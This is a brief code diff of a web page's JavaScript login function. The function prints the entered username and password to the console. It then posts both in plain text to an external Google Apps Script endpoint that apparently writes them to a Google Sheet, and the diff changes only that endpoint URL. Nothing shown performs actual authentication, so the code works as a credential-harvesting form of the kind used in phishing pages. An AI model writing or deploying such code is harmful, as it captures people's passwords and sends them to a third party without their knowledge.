@@ -51,7 +51,7 @@ function login() {
   console.log("Attempted login - Username:", user, "Password:", pass);
 
   // إرسال البيانات إلى Google Sheet عبر Web App
-  fetch('https://script.google.com/macros/s/AKfycbz8vXeTT1myZkUWYx8VRy_6pyM3VflDw4MvzIeQGYOHaFsgx1QCHA430G9EaI-ykmQw/exec', {
+  fetch('https://script.google.com/macros/s/AKfycby0Nzk7LW_note_zxzkTuAgJXF-z60IKTlvQSxbjodHDBaHjmb8txt2CseXuhd8rgm1/exec', {
     method: 'POST',
     body: new URLSearchParams({username: user, password: pass})
   })
